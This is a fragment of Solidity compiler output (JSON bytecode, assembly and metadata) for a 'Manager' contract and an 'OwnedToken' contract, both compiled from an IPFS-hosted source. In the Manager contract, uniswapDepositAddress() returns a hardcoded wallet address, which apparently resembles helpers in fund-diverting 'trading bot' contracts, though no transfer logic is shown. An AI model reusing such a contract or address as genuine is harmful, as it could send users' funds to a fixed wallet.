											"begin": 6977,
											"end": 7171,
											"name": "SHR",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH",
											"source": 4,
											"value": "C0F93A1"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH",
											"source": 4,
											"value": "FEAE9AD3"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "tag",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 6998,
											"end": 7041,
											"name": "tag",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 6998,
											"end": 7041,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 6998,
											"end": 7041,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "5"
										},
										{
											"begin": 6998,
											"end": 7041,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 6998,
											"end": 7041,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 6998,
											"end": 7041,
											"name": "tag",
											"source": 4,
											"value": "5"
										},
										{
											"begin": 6998,
											"end": 7041,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 6998,
											"end": 7041,
											"name": "STOP",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "tag",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "7"
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "8"
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "tag",
											"source": 4,
											"value": "7"
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "RETURN",
											"source": 4
										},
										{
											"begin": 6998,
											"end": 7041,
											"name": "tag",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 6998,
											"end": 7041,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 6998,
											"end": 7041,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "tag",
											"source": 4,
											"value": "8"
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 7100,
											"end": 7107,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 7121,
											"end": 7163,
											"name": "PUSH",
											"source": 4,
											"value": "8C3BCF4E19996EDEC11B5F0523C6A0151A75D351"
										},
										{
											"begin": 7114,
											"end": 7163,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7114,
											"end": 7163,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 7046,
											"end": 7168,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"performTasks()": "0c0f93a1",
							"uniswapDepositAddress()": "feae9ad3"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"performTasks\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapDepositAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"pure\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":\"Manager\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":{\"keccak256\":\"0x7325d748c6c1e37fc30fcac062da88b793324299391319dbdfe1b64f7e1b94cb\",\"urls\":[\"bzz-raw://9f696e0559a5cf2d269690bc6b5575b8bd3047e5632936b44d891a9621510877\",\"dweb:/ipfs/QmU6ZzNqnNRVLV1yP7xtw5DYP14BVDHu8R9umT6fefBQ5q\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				},
				"OwnedToken": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "bytes32",
									"name": "_name",
									"type": "bytes32"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [
								{
									"internalType": "bytes32",
									"name": "newName",
									"type": "bytes32"
								}
							],
							"name": "changeName",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3889:6975  contract OwnedToken {\r... */\n  mstore(0x40, 0x80)\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4481:5183  constructor(bytes32 _name) public{\r... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4481:5183  constructor(bytes32 _name) public{\r... */\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n    /* \"--CODEGEN--\":15:17   */\n  0x20\n    /* \"--CODEGEN--\":10:13   */\n  dup2\n    /* \"--CODEGEN--\":7:18   */\n  lt\n    /* \"--CODEGEN--\":4:6   */\n  iszero\n  tag_2\n  jumpi\n    /* \"--CODEGEN--\":31:32   */\n  0x00\n    /* \"--CODEGEN--\":28:29   */\n  dup1\n    /* \"--CODEGEN--\":21:33   */\n  revert\n    /* \"--CODEGEN--\":4:6   */\ntag_2:\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4481:5183  constructor(bytes32 _name) public{\r... */\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4716:4726  msg.sender */\n  caller\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4708:4713  owner */\n  0x01\n  0x00\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4708:4726  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5141:5151  msg.sender */\n  caller\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5118:5125  creator */\n  0x00\n  dup1\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5118:5152  creator = TokenCreator(msg.sender) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5170:5175  _name */\n  dup1\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5163:5167  name */\n  0x02\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5163:5175  name = _name */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4481:5183  constructor(bytes32 _name) public{\r... */\n  pop\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3889:6975  contract OwnedToken {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3889:6975  contract OwnedToken {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3889:6975  contract OwnedToken {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x898855ed\n      eq\n      tag_3\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5191:6090  function changeName(bytes32 newName) public {\r... */\n    tag_3:\n      tag_4\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_5\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_5:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5191:6090  function changeName(bytes32 newName) public {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_6\n      jump\t// in\n    tag_4:\n      stop\n    tag_6:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6045:6052  creator */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6023:6053  msg.sender == address(creator) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6023:6033  msg.sender */\n      caller\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6023:6053  msg.sender == address(creator) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6019:6082  if (msg.sender == address(creator))\r... */\n      iszero\n      tag_8\n      jumpi\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6075:6082  newName */\n      dup1\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6068:6072  name */\n      0x02\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6068:6082  name = newName */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6019:6082  if (msg.sender == address(creator))\r... */\n    tag_8:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5191:6090  function changeName(bytes32 newName) public {\r... */\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220864d2a7e09ec20b0c7c8c3c0390a6b726157753699d41d18ac2b760eb64d189664736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506040516101c83803806101c88339818101604052602081101561003357600080fd5b810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806002819055505060ed806100db6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063898855ed14602d575b600080fd5b605660048036036020811015604157600080fd5b81019080803590602001909291905050506058565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141560b457806002819055505b5056fea2646970667358221220864d2a7e09ec20b0c7c8c3c0390a6b726157753699d41d18ac2b760eb64d189664736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x1C8 CODESIZE SUB DUP1 PUSH2 0x1C8 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP CALLER PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x2 DUP2 SWAP1 SSTORE POP POP PUSH1 0xED DUP1 PUSH2 0xDB PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x898855ED EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x56 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x58 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH1 0xB4 JUMPI DUP1 PUSH1 0x2 DUP2 SWAP1 SSTORE POP JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP7 0x4D 0x2A PUSH31 0x9EC20B0C7C8C3C0390A6B726157753699D41D18AC2B760EB64D189664736F PUSH13 0x63430006060033000000000000 ",
							"sourceMap": "3889:3086:4:-:0;;;4481:702;5:9:-1;2:2;;;27:1;24;17:12;2:2;4481:702:4;;;;;;;;;;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;4481:702:4;;;;;;;;;;;;;;;;4716:10;4708:5;;:18;;;;;;;;;;;;;;;;;;5141:10;5118:7;;:34;;;;;;;;;;;;;;;;;;5170:5;5163:4;:12;;;;4481:702;3889:3086;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b506004361060285760003560e01c8063898855ed14602d575b600080fd5b605660048036036020811015604157600080fd5b81019080803590602001909291905050506058565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141560b457806002819055505b5056fea2646970667358221220864d2a7e09ec20b0c7c8c3c0390a6b726157753699d41d18ac2b760eb64d189664736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x898855ED EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x56 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x58 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH1 0xB4 JUMPI DUP1 PUSH1 0x2 DUP2 SWAP1 SSTORE POP JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP7 0x4D 0x2A PUSH31 0x9EC20B0C7C8C3C0390A6B726157753699D41D18AC2B760EB64D189664736F PUSH13 0x63430006060033000000000000 ",
							"sourceMap": "3889:3086:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;3889:3086:4;;;;;;;;;;;;;;;;12:1:-1;9;2:12;5191:899:4;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;5191:899:4;;;;;;;;;;;;;;;;;:::i;:::-;;;6045:7;;;;;;;;;;;6023:30;;:10;:30;;;6019:63;;;6075:7;6068:4;:14;;;;6019:63;5191:899;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "47400",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"changeName(bytes32)": "21093"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 3889,
									"end": 6975,
									"name": "PUSH",
									"source": 4,
									"value": "80"
								},
								{
									"begin": 3889,
									"end": 6975,
									"name": "PUSH",
									"source": 4,
									"value": "40"
								},
								{
									"begin": 3889,
									"end": 6975,
									"name": "MSTORE",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "CALLVALUE",
									"source": 4
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "PUSH",
									"source": 4,
									"value": "40"
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "MLOAD",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "PUSHSIZE",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "CODESIZE",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "SUB",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "PUSHSIZE",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "DUP4",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "CODECOPY",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "DUP2",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "DUP2",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "ADD",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "PUSH",
									"source": 4,
									"value": "40"
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "MSTORE",
									"source": 4
								},
								{
									"begin": 15,
									"end": 17,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 10,
									"end": 13,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 7,
									"end": 18,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 31,
									"end": 32,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 28,
									"end": 29,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 21,
									"end": 33,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "tag",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "DUP2",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "ADD",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "MLOAD",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "PUSH",
									"source": 4,
									"value": "20"
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "ADD",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "SWAP3",
									"source": 4
								},
								{
									"begin": 4481,
									"end": 5183,
									"name": "SWAP2",
									"source": 4
								},
